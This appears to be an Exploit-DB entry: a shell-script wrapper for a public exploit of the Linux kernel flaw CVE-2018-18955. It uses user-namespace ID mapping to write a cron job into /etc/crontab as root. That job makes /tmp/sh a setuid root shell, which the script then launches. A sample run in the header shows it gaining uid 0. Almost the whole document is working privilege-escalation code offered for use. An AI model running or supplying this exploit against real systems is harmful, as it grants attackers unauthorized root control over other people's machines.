#
# EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47164.zip
#
# wrapper for Jann Horn&#039;s exploit for CVE-2018-18955
# uses crontab technique
# ---
# test@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955$ ./exploit.cron.sh
# [*] Compiling...
# [*] Writing payload to /tmp/payload...
# [*] Adding cron job... (wait a minute)
# [.] starting
# [.] setting up namespace
# [~] done, namespace sandbox set up
# [.] mapping subordinate ids
# [.] subuid: 165536
# [.] subgid: 165536
# [~] done, mapped subordinate ids
# [.] executing subshell
# [+] Success:
# -rwsrwxr-x 1 root root 8384 Nov 21 19:47 /tmp/sh
# [*] Cleaning up...
# [!] Remember to clean up /etc/crontab
# [*] Launching root shell: /tmp/sh
# root@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955# id
# uid=0(root) gid=0(root) groups=0(root),1001(test)

rootshell="/tmp/sh"
bootstrap="/tmp/payload"

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

if ! command_exists gcc; then
  echo &#039;[-] gcc is not installed&#039;
  exit 1
fi

if ! command_exists /usr/bin/newuidmap; then
  echo &#039;[-] newuidmap is not installed&#039;
  exit 1
fi

if ! command_exists /usr/bin/newgidmap; then
  echo &#039;[-] newgidmap is not installed&#039;
  exit 1
fi

if ! test -w .; then
  echo &#039;[-] working directory is not writable&#039;
  exit 1
fi

echo "[*] Compiling..."

if ! gcc subuid_shell.c -o subuid_shell; then
  echo &#039;Compiling subuid_shell.c failed&#039;
  exit 1
fi

if ! gcc subshell.c -o subshell; then
  echo &#039;Compiling gcc_subshell.c failed&#039;
  exit 1
fi

if ! gcc rootshell.c -o "${rootshell}"; then
  echo &#039;Compiling rootshell.c failed&#039;
  exit 1
fi

echo "[*] Writing payload to ${bootstrap}..."

echo "#!/bin/sh\n/bin/chown root:root ${rootshell};/bin/chmod u+s ${rootshell}" > $bootstrap
/bin/chmod +x "${bootstrap}"

echo "[*] Adding cron job... (wait a minute)"

echo "echo &#039;* * * * * root ${bootstrap}&#039; >> /etc/crontab" | ./subuid_shell ./subshell
sleep 60

if ! test -u "${rootshell}"; then
  echo &#039;[-] Failed&#039;
  /bin/rm "${rootshell}"
  /bin/rm "${bootstrap}"
  exit 1
fi

echo &#039;[+] Success:&#039;
ls -la "${rootshell}"

echo &#039;[*] Cleaning up...&#039;
/bin/rm "${bootstrap}"
/bin/rm subuid_shell
/bin/rm subshell
if command_exists /bin/sed; then
  echo "/bin/sed -i &#039;\$ d&#039; /etc/crontab" | $rootshell
else
  echo "[!] Manual clean up of /etc/crontab required"
fi

echo "[*] Launching root shell: ${rootshell}"
$rootshell

